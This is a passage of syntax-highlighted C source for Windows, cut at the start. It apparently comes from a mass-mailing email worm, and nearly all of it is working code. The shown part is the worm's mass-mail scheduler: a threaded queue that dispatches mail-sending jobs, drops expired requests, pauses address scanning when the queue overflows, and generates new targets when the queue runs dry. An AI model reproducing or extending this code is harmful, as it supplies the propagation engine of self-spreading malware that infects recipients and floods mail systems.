        </span><span class="sc11">GlobalFree</span><span class="sc10">((</span><span class="sc11">HGLOBAL</span><span class="sc10">)</span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ex1</span><span class="sc10">:</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mxs_cached</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mxs_cached</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">mxs_cached</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc10">--;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">_stdcall</span><span class="sc0"> </span><span class="sc11">mmsender_th</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">pv</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">pv</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">InterlockedIncrement</span><span class="sc10">(&amp;</span><span class="sc11">mmshed_run_threads</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">state</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">mmsender</span><span class="sc10">(</span><span class="sc11">mq</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">state</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mmshed_run_threads</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">InterlockedDecrement</span><span class="sc10">(&amp;</span><span class="sc11">mmshed_run_threads</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">ExitThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//-----------------------------------------------------------------------------
</span><span class="sc1">/* MASSMAIL SHEDULER */</span><span class="sc0">

</span><span class="sc9">#define MMSHED_THREADS          4
#define MMSHED_QUEUE_OVERFLOW   4096       </span><span class="sc1">/* critical number of requests in the queue */</span><span class="sc0">
</span><span class="sc9">#define MMSHED_UNPROC_FREEZE    512
#define MMSHED_REQ_EXPIRES      (2*3600)   </span><span class="sc1">/* in seconds */</span><span class="sc0">
</span><span class="sc9">#define MMSHED_GENTIMEOUT       (6*1000)   </span><span class="sc1">/* in milliseconds */</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">mmshed_rmold</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mq</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">mq_ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">delta</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mq_ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">**)&amp;</span><span class="sc11">massmail_queue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">massmail_queue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">state</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc1">/* != "completed" */</span><span class="sc0">
            </span><span class="sc11">mq_ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">delta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">tick_got</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">1000</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">delta</span><span class="sc10">+</span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">delta</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">MMSHED_REQ_EXPIRES</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">p1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">*</span><span class="sc11">mq_ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">HeapFree</span><span class="sc10">(</span><span class="sc11">GetProcessHeap</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">mq_ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">massmail_main</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mq1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mq_best</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">queue_status</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/* 0=okay, 1=many unprocessed, 2=no unprocessed */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">queue_total</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">queue_unprocessed</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hThread</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">tid</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">last_req_tick</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">queue_status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mmshed_run_threads</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">is_online</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">2048</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">scan_freeze</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">16384</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2048</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">scan_freeze</span><span class="sc10">((</span><span class="sc11">queue_status</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">queue_total</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">queue_unprocessed</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">last_req_tick</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq1</span><span class="sc10">=</span><span class="sc11">massmail_queue</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mq_best</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq1</span><span class="sc10">=</span><span class="sc11">mq1</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">queue_total</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq1</span><span class="sc10">-&gt;</span><span class="sc11">state</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc1">/* "not processed" */</span><span class="sc0">
                </span><span class="sc11">queue_unprocessed</span><span class="sc10">++;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq_best</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq_best</span><span class="sc10">-&gt;</span><span class="sc11">priority</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">mq1</span><span class="sc10">-&gt;</span><span class="sc11">priority</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">mq_best</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mq1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">mq_best</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mq1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq1</span><span class="sc10">-&gt;</span><span class="sc11">tick_got</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">last_req_tick</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">last_req_tick</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mq1</span><span class="sc10">-&gt;</span><span class="sc11">tick_got</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">queue_total</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">MMSHED_QUEUE_OVERFLOW</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">mmshed_rmold</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">queue_unprocessed</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">MMSHED_UNPROC_FREEZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">queue_status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">scan_freeze</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">queue_status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">queue_status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">queue_unprocessed</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq_best</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">queue_status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">scan_freeze</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">queue_total</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">last_req_tick</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">GetTickCount</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">last_req_tick</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">MMSHED_GENTIMEOUT</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">mm_gen</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">128</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1024</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mmshed_run_threads</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">MMSHED_THREADS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">256</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">mq_best</span><span class="sc10">-&gt;</span><span class="sc11">state</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">hThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mmsender_th</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc10">)</span><span class="sc11">mq_best</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">tid</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hThread</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">hThread</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">mq_best</span><span class="sc10">-&gt;</span><span class="sc11">state</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1024</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hThread</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">256</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">massmail_init</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">massmail_queue</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mmshed_run_threads</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mm_dnscache</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">_stdcall</span><span class="sc0"> </span><span class="sc11">massmail_main_th</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">pv</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">massmail_main</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">ExitThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
